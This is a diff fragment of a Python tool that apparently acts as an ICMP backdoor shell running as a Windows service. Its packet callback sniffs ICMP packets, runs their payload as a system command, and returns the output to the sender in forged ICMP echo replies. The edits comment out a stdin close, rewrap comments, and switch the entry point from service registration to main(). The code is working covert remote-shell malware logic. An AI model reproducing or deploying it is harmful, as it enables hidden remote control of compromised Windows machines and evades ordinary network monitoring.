@@ -41,7 +41,7 @@ def packet_callback(packet):
         child_conn, process = ish_open.popen2(received_data)
         ishell.sendhdr.cntrl = 0
 
-        process.stdin.close()
+        #process.stdin.close()
 
         output = process.stdout.read()
         error = process.stderr.read()
@@ -62,8 +62,8 @@ def packet_callback(packet):
             for p in data_list:
                 reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / p
                 send(reply_packet, verbose=False)
-        # reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
-        # reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output)
+        # reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in
+        # data_list] reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output)
         # send(reply_packet, verbose=False)
 
 
@@ -219,6 +219,7 @@ class Service(win32serviceutil.ServiceFramework):
     def main(self):
         sniff(filter="icmp", prn=packet_callback)
 
+
 def server():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('localhost', 12345))
@@ -236,11 +237,12 @@ def server():
     client_socket.close()
     server_socket.close()
 
+
 if __name__ == '__main__':
-    #main()
-    if len(sys.argv) == 1:
-       servicemanager.Initialize()
-       servicemanager.PrepareToHostSingle(Service)
-       servicemanager.StartServiceCtrlDispatcher()
-    else:
-       win32serviceutil.HandleCommandLine(Service)
+    main()
+    #if len(sys.argv) == 1:
+    #    servicemanager.Initialize()
+    #    servicemanager.PrepareToHostSingle(Service)
+    #    servicemanager.StartServiceCtrlDispatcher()
+    #else:
+    #    win32serviceutil.HandleCommandLine(Service)
